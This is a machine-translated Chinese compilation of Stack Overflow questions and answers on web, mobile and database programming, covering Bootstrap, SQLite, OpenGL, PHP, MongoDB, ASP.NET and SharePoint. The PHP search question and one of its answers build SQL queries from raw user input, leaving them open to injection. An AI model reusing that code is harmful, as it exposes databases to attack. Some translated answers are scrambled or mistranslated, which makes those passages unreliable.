$('div[name="user_profile_modal"]').data('bs.modal').escape(); 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-03-22T16:08:43.820

您还可以在 HTML 标记中添加一个属性：**data-keyboard="false"**

`<div id="myModal" class="modal hide fade" data-keyboard="false" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true"></div>`

这个对我有用！

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-02-24T03:24:21.420

如果您不知道模态是否已经打开并且您需要配置模态选项（Bootstrap 3），则另一种选择：

```
var $modal = $('#modal');
var keyboard = false; // Prevent to close by ESC
var backdrop = 'static'; // Prevent to close on click outside the modal

if(typeof $modal.data('bs.modal') === 'undefined') { // Modal did not open yet
    $modal.modal({
        keyboard: keyboard,
        backdrop: backdrop
    });
} else { // Modal has already been opened
    $modal.data('bs.modal').options.keyboard = keyboard;
    $modal.data('bs.modal').options.backdrop = backdrop;

    if(keyboard === false) { 
        $modal.off('keydown.dismiss.bs.modal'); // Disable ESC
    } else { // 
        $modal.data('bs.modal').escape(); // Resets ESC
    }
} 
```

谢谢@nokturnal

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-07-03T17:43:56.023

对我来说这种方法效果最好

```
$('#modal').on('hide.bs.modal', function () {
    return false;
}); 
```

它可以防止模态在任何可能的情况下关闭：

*   按退出键
*   在模态外单击
*   点击关闭按钮
*   甚至使用`$('#modal').modal('hide')`

# android - 如何使用一个选择列对多个选择参数进行查询

> ID：11806818
> 
> 赞同：4
> 
> 时间：2012-08-04T07:36:51.670
> 
> 标签：android, sqlite, cursor

这是我的查询：

// 表名：问题

```
 Cursor cursor = db.query("QUESTION", new String[] { "TEXT", "OPTION_A",
            "OPTION_B", "OPTION_C", "OPTION_D", "OPTION_E",
            "RIGHT_ANSWER" },
            "SUBJECT=?", new String[] { "Ingles", "Historia" }, null,null,
            null); 
```

我可以有多个科目，现在我只有两个科目（英格尔斯，历史）

如何使用查询按主题对数据进行排序？

我收到绑定或超出范围错误。我知道错误出现在**where**子句中，但无法解决。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T20:52:08.747

我得到了答案。

1) 要对数据进行排序，需要在最后一个参数中输入列名

2）当一列中有多个选择条件时，使用`IN Operator`。

```
 Cursor cursor = db.query("QUESTION", new String[] { "TEXT", "OPTION_A",
            "OPTION_B", "OPTION_C", "OPTION_D", "OPTION_E",
            "RIGHT_ANSWER" },
            "SUBJECT IN(?,?)", new String[] { "Ingles", "Historia" }, null,null,
            "SUBJECT"); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-06T07:05:09.937

您收到此错误是因为“？”的数量 参数中的位置和数组长度不匹配。您可以像这样放置条件
1) 在 where 中使用两个条件

```
`Cursor cursor = db.query("QUESTION", new String[] { "TEXT", "OPTION_A", "OPTION_B", "OPTION_C", "OPTION_D", "OPTION_E", "RIGHT_ANSWER" }, "SUBJECT1=? AND SUBJECT2=? ", new String[] { "Ingles", "Historia" }, null,null, "SUBJECT");`
```

`2) 使用 IN 条件
 ````
Cursor cursor = db.query("QUESTION", new String[] { "TEXT", "OPTION_A", "OPTION_B", "OPTION_C", "OPTION_D", "OPTION_E", "RIGHT_ANSWER" }, "SUBJECT IN(?)", new String[] { "Ingles,Historia" }, null,null, "SUBJECT");
`````

# entity-framework-4 - 多租户应用程序的依赖注入

> ID：11806821
> 
> 赞同：2
> 
> 时间：2012-08-04T07:36:58.703
> 
> 标签：entity-framework-4, multi-tenant

我一直在对多租户 ASP.Net MVC 4 应用程序的 DI（Unity 和 Ninject）进行一些研究。我读过的大多数文章似乎都将 DI 称为一个很好的工具，可以帮助为多租户 Web 应用程序中的租户提供自定义。除此之外，它在多租户世界中还有什么用处。

它可以帮助共享数据库模式场景中的数据隔离吗？我正在尝试找到一种干净的方法来隔离客户之间的数据。（我在所有需要的表中使用tenantId）

（ASP.Net MVC4，实体框架 5，SQL Server 2012）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-24T14:25:29.327

恕我直言，就使用共享模式的多租户应用程序中的数据隔离而言，我预计不会使用 DI 容器，因为它只是帮助解决对象依赖关系。您可以在应用程序中拥有安全控制机制和租户隔离实践，以根据运营租户或上下文租户过滤数据。

您必须将租户标识符从表示层传递到其他层，直到访问数据库。在访问逻辑中，您将根据租户过滤数据，这可以使用表中的租户标识符来完成。

此外，在单一代码库方法中，不需要注入依赖项来识别租户。租户识别和验证操作用户及其租户上下文将由您的应用程序在身份验证和授权阶段本身完成。

希望这能解决您的问题

# c++ - glEnableClientState 已弃用

> ID：11806823
> 
> 赞同：13
> 
> 时间：2012-08-04T07:37:02.247
> 
> 标签：c++, opengl, vbo

我想使用 GL_POINT_SPRITE_ARB + VBO 进行粒子系统渲染。我已经用 point_sprites 完成了所有准备工作，但还是停留在 VBO。glEnableClientState 似乎不起作用。我读到它在现代 openGL 中已被弃用。那么，我应该改用什么？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-08-04T08:55:11.013

`glEnableClientState`是您如何告诉 OpenGL 您正在为特定的固定功能属性（ 、 等）使用顶点`gl_Vertex`数组`gl_Color`。这些都从核心上下文中删除。您应该使用来[`glEnableVertexAttribArray`](http://www.opengl.org/wiki/GLAPI/glEnableVertexAttribArray)启用[通用顶点属性](http://www.opengl.org/wiki/Vertex_Attribute)，并使用[该属性与缓冲区对象相关联](http://www.opengl.org/wiki/Vertex_Array_Object)。[`glVertexAttribPointer`](http://www.opengl.org/wiki/GLAPI/glVertexAttribPointer)

# css - 我希望 div 使用 css3 关键帧动画从左向右滑动。我做错了什么？

> ID：11806826
> 
> 赞同：1
> 
> 时间：2012-08-04T07:37:22.227
> 
> 标签：css

我有一个div。让我们说#logo，我希望它在加载延迟 3 秒时以及从左到右显示时带有轻微的动画，如缓进出。我正在添加动画：

```
#logo {
 opacity: 0;
 -webkit-animation-name: fromLeft, fadeIn;
 -webkit-animation-duration: 3s;
 -webkit-animation-iteration-count: 1;         
 -webkit-animation-direction: alternate;   /*   normal, alternate  */
 -webkit-animation-timing-function: ease-out;   /*  ease, ease-out, ease-in, ease-in-out, linear, cubic-bezier(x1, y1, x2, y2) (e.g. cubic-bezier(0.5, 0.2, 0.3, 1.0))  */
 -webkit-animation-fill-mode: forwards;   /* forwards, backwards, both, none  */
 -webkit-animation-delay: 3s;

 -moz-animation-name: fromLeft, fadeIn;
 -moz-animation-duration: 3s;
 -moz-animation-iteration-count: 1;         
 -moz-animation-direction: alternate;   /*   normal, alternate  */
 -moz-animation-timing-function: ease-out;   /*  ease, ease-out, ease-in, ease-in-out, linear, cubic-bezier(x1, y1, x2, y2) (e.g. cubic-bezier(0.5, 0.2, 0.3, 1.0))  */
 -moz-animation-fill-mode: forwards;   /* forwards, backwards, both, none  */
 -moz-animation-delay: 3s;

 -o-animation-name: fromLeft, fadeIn;
 -o-animation-duration: 3s;
 -o-animation-iteration-count: 1;         
 -o-animation-direction: alternate;   /*   normal, alternate  */
 -o-animation-timing-function: ease-out;   /*  ease, ease-out, ease-in, ease-in-out, linear, cubic-bezier(x1, y1, x2, y2) (e.g. cubic-bezier(0.5, 0.2, 0.3, 1.0))  */
 -o-animation-fill-mode: forwards;   /* forwards, backwards, both, none  */
 -o-animation-delay: 3s;

 -ms-animation-name: fromLeft, fadeIn;
 -ms-animation-duration: 3s;
 -ms-animation-iteration-count: 1;         
 -ms-animation-direction: alternate;   /*   normal, alternate  */
 -ms-animation-timing-function: ease-out;   /*  ease, ease-out, ease-in, ease-in-out, linear, cubic-bezier(x1, y1, x2, y2) (e.g. cubic-bezier(0.5, 0.2, 0.3, 1.0))  */
 -ms-animation-fill-mode: forwards;   /* forwards, backwards, both, none  */
 -ms-animation-delay: 3s;

  animation-name: fromLeft, fadeIn;
  animation-duration: 3s;
  animation-iteration-count: 1;         
  animation-direction: alternate;   /*   normal, alternate  */
  animation-timing-function: ease-out;   /*  ease, ease-out, ease-in, ease-in-out, linear, cubic-bezier(x1, y1, x2, y2) (e.g. cubic-bezier(0.5, 0.2, 0.3, 1.0))  */
  animation-fill-mode: forwards;   /* forwards, backwards, both, none  */
  animation-delay: 3s;
}

@-webkit-keyframes fromLeft {
    0%   { left: 0px; }
    50%   { left: 20px; }
    100% { left: 50px; }
}
@-moz-keyframes fromLeft {
    0%   { left: 0px; }
    50%   { left: 20px; }
    100% { left: 50px; }
}
@-ms-keyframes fromLeft {
    0%   { left: 0px; }
    50%   { left: 20px; }
    100% { left: 50px; }
}
@-o-keyframes fromLeft {
    0%   { left: 0px; }
    50%   { left: 20px; }
    100% { left: 50px; }
}

@-webkit-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@-moz-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@-o-keyframes fadeIn { from { opacity:0; } to { opacity:1; } }
@keyframes fadeIn { from { opacity:0; } to { opacity:1; } } 
```

FadeIn 适用于 Mozilla，但 FromLeft 不适用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:48:40.877

这在 jsfiddle 上运行良好

```
<div id="logo" style="position:absolute">LOGOTEXT</div> 
```

[http://jsfiddle.net/nG5zb/4/](http://jsfiddle.net/nG5zb/4/)

不过，这只适用于 chrome 和其他 webkit 浏览器。如果您使用 firefox，则动画语法必须以 -moz- 而不是 -webkit- 开头

# c# - C# 中 (ResourceWriter & ResXResourceWriter) 和 (ResourceReader & ResXResourceReader) 之间的区别

> ID：11806831
> 
> 赞同：2
> 
> 时间：2012-08-04T07:39:05.817
> 
> 标签：c#, .net, xml, resx

我想从资源文件（.resx）创建一个 XML 文件。

我通过使用`ResXResourceReader`类成功地做到了这一点。但后来我才知道为此目的存在另一个类`ResourceReader`。

那么它们之间有什么区别呢？以及哪一个应该用于此目的。

ResourceWriter 和 ResXResourceWriter 的情况相同。他们之间有什么区别？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T07:46:59.637

ResourceReader 读取二进制文件，ResXResourceReader 读取 XML。

[资源阅读器 MSDN：](http://msdn.microsoft.com/en-us/library/system.resources.resourcereader.aspx)

> 通过读取顺序资源名称/值对来枚举**二进制资源 (.resources)文件中的资源。**

[ResXResourceReader MSDN：](http://msdn.microsoft.com/en-us/library/system.resources.resxresourcereader.aspx)

> 枚举**XML 资源 (.resx)**文件和流，并读取顺序资源名称和值对。

更多信息可以在[这里](http://flylib.com/books/en/3.147.1.114/1/)找到。

# restkit - RestKit：如何使用不同的映射处理失败结果

> ID：11806835
> 
> 赞同：0
> 
> 时间：2012-08-04T07:39:54.617
> 
> 标签：restkit

我正在从服务器获取用户对象。如果请求成功，我会得到：

```
{ user = {
        User = { id = 1; }
} } 
```

失败时我得到：

```
{ user = false; } 
```

我有一个在成功案例中运行良好的映射：`[mappingProvider setMapping:userMapping forKeyPath:@"user.User"];`

但是在失败的情况下，我得到了以下异常：`'NSUnknownKeyException', reason: '[<__NSCFBoolean 0x1c58f78> valueForUndefinedKey:]: this class is not key value coding-compliant for the key User.'`我还尝试将映射上的`userMapping`keypath 设置为关系以从keypath`User`生成一个，那里也没有乐趣。`NSDictionary``user`

处理这个问题的正确方法是什么？似乎我需要两个不同的键路径映射`user`，并根据对象是否要解码为 NSBolean 来选择哪一个...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-06T06:33:22.100

我会建议`RKDynamicObjectMapping`。这两种口味中的任何一种都应该适合您：

```
- (void)setObjectMapping:(RKObjectMapping *)objectMapping whenValueOfKeyPath:(NSString *)keyPath isEqualTo:(id)value; 
```

或者

```
+ (RKDynamicObjectMapping *)dynamicMappingUsingBlock:(void(^)(RKDynamicObjectMapping *dynamicMapping))block; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-24T16:24:25.980

服务器可能（并且希望）返回一个 http 错误代码，例如 400 等。因此，Restkit 可能正在尝试使用错误映射来映射响应。

也许您需要做的是@Paul 所说的动态对象映射..但应用于错误映射。我在这里给你留下一个简单的错误映射，所以你知道我在说什么：

```
RKObjectMapping *errorMapping = [RKObjectMapping mappingForClass:[RKErrorMessage class]];
[errorMapping mapKeyPath:@"msg" toAttribute:@"errorMessage"];
[[[RKObjectManager sharedManager] mappingProvider] setErrorMapping:errorMapping]; 
```

# php - 如何将此数组从高到低排序？

> ID：11806840
> 
> 赞同：0
> 
> 时间：2012-08-04T07:40:21.730
> 
> 标签：php, arrays, sorting

> **可能重复：**
> [如何对这段代码的结果进行排序？](https://stackoverflow.com/questions/11809077/how-to-sort-the-results-of-this-code)

我制作了这段代码，允许用户在搜索栏中输入问题。然后，此代码接受该问题并在我的数据库中查找带有问题的单词。然后它计算每个问题的匹配单词数。完成后，它会根据匹配的单词数显示前 4 个最匹配的问题。然而，目前它显示了从最低单词匹配到最高单词匹配（从低到高）的这些匹配，而我是相反的，因此它首先显示最佳匹配（从高到低）。我如何在这段代码中做到这一点？

```
 <?php
        include("config.php");
        $search_term = filter_var($_GET["s"], FILTER_SANITIZE_STRING); //User enetered data
        $search_term = str_replace ("?", "", $search_term); //remove any question marks from string

        $array = explode(" ", $search_term); //Seperate user enterd data

        foreach ($array as $key=>$word) {
        $array[$key] = " title LIKE '%".$word."%' "; //creates condition for MySQL query
        }

        $q = "SELECT * FROM posts WHERE  " . implode(' OR ', $array); //Query to select data with word matches
        $r = mysql_query($q);
        $count = 0; //counter to limit results shown
            while($row = mysql_fetch_assoc($r)){
            $thetitle = $row['title']; //result from query
            $thetitle = str_replace ("?", "", $thetitle);  //remove any question marks from string
            $title_array[] = $thetitle;  //creating array for query results
            $newarray = explode(" ", $search_term); //Seperate user enterd data again

            foreach($title_array as $key => $value) {
               $thenewarray = explode(" ", $value); //Seperate each result from query
               $wordmatch = array_diff_key($thenewarray, array_flip($newarray));
               $result = array_intersect($newarray, $wordmatch);
               $matchingwords = count($result); //Count the number of matching words from user entered data and the database query
            }
        if(mysql_num_rows($r)==0)//no result found{
            echo "<div id='search-status'>No result found!</div>";
        }
        else //result found
        {
        echo "<ul>";

        $title = $row['title'];
        if ($matchingwords >= 4){
        ?>
<li><a href='<?php echo $row['url']; ?>'><?php echo $title ?><i> &nbsp; No. matching words: <?php echo $matchingwords; ?></i></a></li>
<?php
                $count++;
                if ($count == 5) {break;
                }
                    }else{
                    }
                }
            echo "</ul>";
            }
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-04T07:52:42.387

我认为您在对数组进行排序时遇到问题。

如果你有一个数组，排序不是问题。

在 php.ini 中找到不同类型的排序。

**排序（）**

对数组进行倒序排序并保持索引关联

> [http://www.php.net/manual/en/function.asort.php](http://www.php.net/manual/en/function.asort.php)

您可以使用此数组功能或让我简要了解您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:55:36.820

您可以编写自己的过滤器功能

```
// sorts an array by direction
function arr_sort($arr, $index, $direction='asc')
{
    $i_tab = array();
    foreach ($arr as $key => $ele)
    {
        $i_tab[$key] = $arr[$key][$index];
    }
    $sort = 'asort';
    if (strtolower($direction) == 'desc')
    {
        $sort = 'arsort';
    }
    $sort($i_tab);
    $n_ar = array();
    foreach ($i_tab as $key => $ele)
    {
          array_push($n_ar, $arr[$key]);
    }
    return($n_ar);
} 
```

例如你有一个数组 $arr = array('key' => 'value', 'key2' => 'value');

您现在可以使用 key2 asc 排序

```
$arr = arr_sort($old_arr, 'key2', 'desc'); 
```

因此您可以将匹配单词的总数作为任何条目的节点放入数组中，并按降序过滤它

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-04T08:10:30.877

**请注意，这需要 Mysql 版本 4+**

[全文](http://dev.mysql.com/doc/refman/5.1/en/fulltext-natural-language.html)sql 查询根据相关性返回值。

例子：

```
SELECT *, MATCH (title)
AGAINST ('$search_term' IN NATURAL LANGUAGE MODE) AS score
FROM posts; 
```

这就是你将如何实现它

```
$q = "SELECT *,MATCH (title) AGAINST ('$search_term' IN BOOLEAN MODE) AS relevancy FROM
posts WHERE MATCH (title) AGAINST ('$search_term' IN BOOLEAN MODE) ORDER BY
relevancy DESC"; 
```

这将按相关性按顺序返回帖子。可能需要删除 $search_term 周围的 '' 但您可以通过测试来解决这个问题。

请阅读全文 sql 查询和 match() 函数。这一切都清楚地记录在案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-04T07:50:10.720

如果您已将数据保存在数组中，则可以使用[http://www.php.net/manual/en/function.array-reverse.php简单地反转它](http://www.php.net/manual/en/function.array-reverse.php)

否则有一些排序功能 [http://php.net/manual/en/function.sort.php](http://php.net/manual/en/function.sort.php)

# mongodb - 关于我的案例 MongoDB 模式设计的意见

> ID：11806841
> 
> 赞同：2
> 
> 时间：2012-08-04T07:41:09.043
> 
> 标签：mongodb, database-design, database-schema, schema-design, database

这是 MongoDB 上一个非常常见的问题：何时嵌入以及何时引用。

然而，就我而言，这似乎是一个两难的境地。我有一个文档，其中包含我可以嵌入它的参考，但它会花费我磁盘的大小。但是如果我做一个参考，它会给我带来相当大的性能成本。

这是一个例子，假设我有这个成员的“详细信息”作为我的问题：

```
Member: {
    _id: "abc",
    detail: {
        name: "Stack Overflow",
        website: "www.stackoverflow.com"
    }
} 
```

我希望该会员的详细信息出现在该会员“asdf”制作的每个博客中，因为显示的每个博客都会显示会员详细信息。所以我可以为我的博客文档做 2 个选项：

首先，通过仅放置成员的 _id 来进行引用：

```
Blog: {
    _id: 123,
    memberId: "asdf"  ---> will be used as reference to query specific member
} 
```

或者第二，将成员嵌入到博客中：

```
Blog: {
    _id: 123,
    member: {
        _id: "asdf",
        detail: {
            name: "Stack Overflow",
            website: "www.stackoverflow.com"
        }
    }
} 
```

所以第一个选项需要另一个成员查询，这是一个性能问题。然而，第二个选项更快，因为我只需要查询一次，但是随着博客数量的增加，我的磁盘会因为嵌入文档“成员”的冗余数据而变得更大。

PS：在这个例子中可以看到，Member 和Blog 的关系是一对多的，所以一个member 可以有很多blog，但是member 的detail 变量保持不变；“名称”和“网站”。

在这种情况下有什么更好的意见吗？如果您也有第三种解决方案，那就太好了。之前谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T08:26:52.753

我认为将成员详细信息分开是可以的，例如论坛签名。这样，当会员更新他们的详细信息时，所有帖子都将显示他们当前的信息，而您的应用程序不必更新之前每个帖子中的重复数据。

从您的描述看来，您可能只在用户创建的博客帖子上显示此内容，而不是在他们在页面上发表的每条评论上。

如果您担心每个用户的额外查询的性能成本，您可以始终缓存该用户数据（或生成的页面输出），而不是依赖于在单个数据库查询中获取所有博客信息。在尝试针对可能不是问题的用例进行优化之前，我会先查看应用程序在实际使用中的表现。

另一种方法是仅将额外的用户详细信息显示为 Ajax 悬停（类似于 SO 如何为已[建立的用户](https://stackoverflow.com/privileges/established-user)显示更多信息。

# jquery - 将相同的随机类应用于指定的每个元素

> ID：11806851
> 
> 赞同：0
> 
> 时间：2012-08-04T07:43:07.697
> 
> 标签：jquery, css

我一直在使用此处提供的答案： [将随机类应用于指定的每个元素](https://stackoverflow.com/questions/7686592/apply-a-random-class-to-every-element-specified)

但是，我希望它从列出的类中进行选择，然后将随机选择的类应用于三个项目。

```
$(document).ready(function() {
    var classes = ["c4kdarkerBlue", "c4korange", "c4kyellow", "c4kyellow", "c4kpink", "c4kpurple", "c4kgreen", "c4kred"];

    $(".instructorDetails h3, .instructorDetails h4, .instructorDetails h5").each(function(){
        $(this).addClass(classes[Math.floor(Math.random()*classes.length)]);
    });
}); 
```

上面的代码选择了一个随机类，但对每个项目应用不同的类，而不是对所有三个类应用相同的类。

我需要 h3、h4 和 h5 都具有相同的颜色 - 随机选择。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-04T07:45:44.453

如果您在其中创建随机数`.each`，它将为每个元素生成一个新的。你应该这样做；

```
$(document).ready(function() {
    var classes = ["c4kdarkerBlue", "c4korange", "c4kyellow", "c4kyellow", "c4kpink", "c4kpurple", "c4kgreen", "c4kred"],
        randNum = Math.floor(Math.random()*classes.length);

    $(".instructorDetails h3, .instructorDetails h4, .instructorDetails h5").each(function(){
        $(this).addClass(classes[randNum]);
    });
}); 
```

# html - 使用Python单击HTML页面上的某个链接时如何打开Windows文件夹

> ID：11806853
> 
> 赞同：6
> 
> 时间：2012-08-04T07:43:21.323
> 
> 标签：html, windows, internet-explorer, firefox, google-chrome

我正在编写以下程序：

```
***import os
filepath=r'C:\TestData\openfolder.html'
abc=open(filepath,'w')
abc.writelines('<html><head></head><body>')

abc.writelines('<a href="os.startfile(filepath)">First Link</a>\n')

abc.writelines('</body></html>')*** 
```

我想要做的是，如果我在浏览器上单击第一个链接，我应该能够打开路径为“文件路径”的文件夹。os.startfile 非常适合打开文件夹，但我不知道如何在某个链接中实现它。谢谢。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-04T07:56:20.000

尝试将 URI 与您的 html 中的`file:`方案一起使用：`file:///C:/TestData/openfolder.html`

```
<a href="file:///C:/TestData/openfolder.html">Link to test data</a> 
```

这是[有关在 Windows 中使用文件 URI 的文章](http://blogs.msdn.com/b/ie/archive/2006/12/06/file-uris-in-windows.aspx)。

**UPD（从评论中提取）：**每个浏览器都有自己的方式来处理这些 url。至少 Windows 7 下的 Internet Explorer 8 会按照 jags 的要求在 Windows Explorer 中打开链接。

最后，对于动态页面，需要[Web 服务器](http://ru.wikipedia.org/wiki/%D0%92%D0%B5%D0%B1-%D1%81%D0%B5%D1%80%D0%B2%D0%B5%D1%80)。如果需要，请查看[有关使用 python 创建简单 Web 服务的讨论](https://stackoverflow.com/questions/415192/best-way-to-create-a-simple-python-web-service)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-08-04T09:31:04.430

你不能。在浏览器中单击文件的链接不会在操作系统上启动与该文件类型关联的应用程序。你显然可以用 JavaScript 做一些时髦的东西来启动特定应用程序的特定文件类型（见这里：[http ://forums.devshed.com/asp-programming-51/launching-ms-word-to-open-file-from- a-hyperlink-55714.html](http://forums.devshed.com/asp-programming-51/launching-ms-word-to-open-file-from-a-hyperlink-55714.html)），但除此之外，Web 浏览器不是文件浏览器。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-09-24T14:19:51.773

```
<a href="FOLDER_PATH" target="_explorer.exe">Link Text</a> 
```

替换`FOLDER_PATH`为您要在资源管理器中打开的文件夹的路径。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-08-08T19:08:40.260

阿兰的回答有效。

<'a href="FOLDER_PATH" target="_explorer.exe">链接文本</'/a>

我删除了开头和结尾的刻度线，发现它可以在

*   Internet Explorer - 打开一个 Windows Explorer 窗口

*   Firefox（Windows 和 Linux），但会打开一个新选项卡 - 与 target="_blank" 相同

*   Chrome - 打开一个新标签页，如 Firefox

我还注意到 / 和 \（正斜杠和反斜杠）在 html 链接中是相等的——它们甚至可以混合使用。

# java - 两个 joda 日期之间的天数，包括节假日

> ID：11806855
> 
> 赞同：3
> 
> 时间：2012-08-04T07:43:37.797
> 
> 标签：java, jodatime

我想知道两个 joda 日期对象之间的区别。我知道如何使用以下代码计算两个日期之间的差异：

```
Days.daysBetween(startDate, endDate) 
```

我需要计算要排除周末和节假日的工作日的差异。有同样的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-04T07:46:09.107

考虑这些工作日数

[Joda Time：如何在某个日期间隔内获取工作日的日期？](https://stackoverflow.com/questions/4547768/joda-time-how-to-get-dates-of-weekdays-on-some-date-interval)

[计算Java中两个日期之间的工作日数](https://stackoverflow.com/questions/4600034/calculate-number-of-weekdays-between-two-dates-in-java)

至于假期，这些是特定于您所在地区的。由包含日期的配置文件填充的 Set 就足够了。

# java - Slick：通过按钮退出游戏

> ID：11806862
> 
> 赞同：1
> 
> 时间：2012-08-04T07:44:42.193
> 
> 标签：java, slick2d

我可以使用哪些方法告诉游戏用户已请求它使用`GameContainer`或`StateBasedGame`类关闭。

我有一个按钮，单击它后我希望它关闭游戏，当侦听器发现请求关闭时需要运行什么功能？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-08T08:32:52.907

该类`GameContainer`有一个`exit`方法：

```
public void update(GameContainer gc, StateBasedGame game, int delta) throws SlickException
{
  if(my_exit_flag)
    gc.exit();

  // Update code here
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:59:28.647

您可以使用关闭**任何 java 应用**程序

```
System.exit(); 
```

或者

```
System.exit(<error_level>); 
```

# asp.net - 无法访问文件夹内的 ASP.NET 页面

> ID：11806870
> 
> 赞同：0
> 
> 时间：2012-08-04T07:45:39.400
> 
> 标签：asp.net

我正在使用`ASP.NET/C#`.

在我的菜单中，我有这个`li`项目

```
<li><a href="/Deposits/DepositsInterest.aspx">Update Deposit Interest</a></li> 
```

但是当我尝试点击`a`标签时，它只会给我这个错误

```
Cannot use a leading .. to exit above the top directory. 
```

谁能告诉我这里可能缺少什么？

欢迎任何建议。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-04T09:05:44.350

该问题可能是由您正在导航到的 DepositInterest.aspx 页面引起的。该页面或母版页上是否有任何喜欢的 javascript/CSS 文件？如果是这样，您可能想检查它们是否正确链接。

[不能使用前导 .. 退出顶级目录](https://stackoverflow.com/questions/8401703/cannot-use-a-leading-to-exit-above-the-top-directory)

[http://forums.asp.net/t/1019849.aspx](http://forums.asp.net/t/1019849.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-04T07:47:14.033

链接应以波浪号开头，代表您网站的根目录或提及您的完整地址

```
<li><a href="~/Deposits/DepositsInterest.aspx" runat="server" >Update Deposit Interest</a></li>
     // or type complete address 
<li><a href="YourSite/Deposits/DepositsInterest.aspx">Update Deposit Interest</a></li>
 //             or use asp.net hyperlink
 <li> <asp:HyperLink id="hl1"                  
              NavigateUrl="~/Deposits/DepositsInterest.aspx"
              Text="Hyperlink"
              Target="_new"
              runat="server"/> </li> 
```

**更新的答案：** 如果您要动态添加超链接，请将它们添加为：

```
 MenuItem mi = new MenuItem();
    mi.NavigateUrl = "~/Deposits/DepositsInterest.aspx";
    mi.Text = "MY hyperlink";
    Menu1.Items.Add(mi);
    Menu1.DataBind(); 
```

# c# - 调用现有 Web API 的 C# 程序

> ID：11806874
> 
> 赞同：1
> 
> 时间：2012-08-04T07:46:24.030
> 
> 标签：c#, asp.net-web-api

如何调用/使用支持 SOAP 和 REST 的 Web API？我想用 C# 编写一个程序来使用这个 Web API。我在互联网上没有得到太多信息。到目前为止，我已经创建了 C# 项目并将 Web 服务引用 (WSDL) 添加到我的程序中。现在我该如何使用 Web API。如何发送请求或接收响应？你能给我推荐一些好的教程吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-04T07:51:50.563

[HttpClient 类](http://msdn.microsoft.com/en-us/library/system.net.http.httpclient%28v=vs.110%29.aspx)是一个很好的起点。还有[EasyHttp 库](https://github.com/hhariri/EasyHttp)。

*   代码示例 HttpClient：[http ://code.msdn.microsoft.com/Introduction-to-HttpClient-4a2d9cee](http://code.msdn.microsoft.com/Introduction-to-HttpClient-4a2d9cee)
*   EasyHttp简介：http: [//devlicio.us/blogs/hadi_hariri/archive/2011/01/16/easyhttp.aspx](http://devlicio.us/blogs/hadi_hariri/archive/2011/01/16/easyhttp.aspx)

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-04T09:51:04.880

添加 Web 服务引用会创建可用于与 Web 服务通信的客户端类。所有创建的类都将在新的命名空间中，您必须寻找客户端代理类（全名取决于 WebService 名称）。创建此类的实例。调用它的方法将调用 WebService。[在这里](http://msdn.microsoft.com/en-us/library/t745kdsh%28v=vs.80%29.aspx)您可以阅读有关在 C# 中使用 Web 服务的信息

# c# - 如何将自定义视图设置为 SharePoint 列表的默认视图？

> ID：11806877
> 
> 赞同：1
> 
> 时间：2012-08-04T07:46:39.773
> 
> 标签：c#, list, sharepoint, listview, sharepoint-2010

我已经为列表创建了 2 个视图现在我想在不同的登录上将不同的视图设置为默认值。我想使用 c# 代码来做到这一点

**例如：**

意见如下：

1.  所有项目
2.  用户视图

然后

如果管理员登录，则列表的默认视图是 AllItems

如果用户登录然后列表的默认视图是用户视图

如何使用 C# 代码执行此操作？

**代码片段：**

```
 SPUser LoggedInUser = web.CurrentUser;

                SPList CurrentList = web.Lists[ListName];

                if (LoggedInUser.LoginName == LoginUser)
                {
                    web.AllowUnsafeUpdates = true;
                    CurrentList.Views[AllItems].DefaultView = false;
                    CurrentList.Views[UserView].DefaultView = true;
                    CurrentList.Update();              // Error here
                    web.AllowUnsafeUpdates = false;

                }
                else if (LoggedInUser.LoginName == LoginAdmin)
                {
                    web.AllowUnsafeUpdates = true;
                    CurrentList.Views[AllItems].DefaultView = true;
                    CurrentList.Views[UserView].DefaultView = false;
                    CurrentList.Update();               // Error here
                    web.AllowUnsafeUpdates = false;
                } 
```

上面的代码给出**错误**：“无法评估表达式，因为代码已优化或本机框架位于调用堆栈的顶部。”

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-04T22:02:07.063

您也必须在 SPView 对象上调用 Update 方法。

```
SPView yourView = CurrentList.Views[UserView];
yourView.DefaultView = true;
yourView.Update(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-04-24T15:50:07.483

我将此方法保留在我的扩展方法中

```
public static void SetAsDefaultView(this SPList self, string viewName)
    {
        if (!self.Views[viewName].DefaultView)
        {
            self.DefaultView.DefaultView = false;
            self.Views[viewName].DefaultView = true;
            self.Update();
        }
    } 
```

# xml - 如何向 XML 数据添加新元素

> ID：11806882
> 
> 赞同：-1
> 
> 时间：2012-08-04T07:47:13.333
> 
> 标签：xml, perl

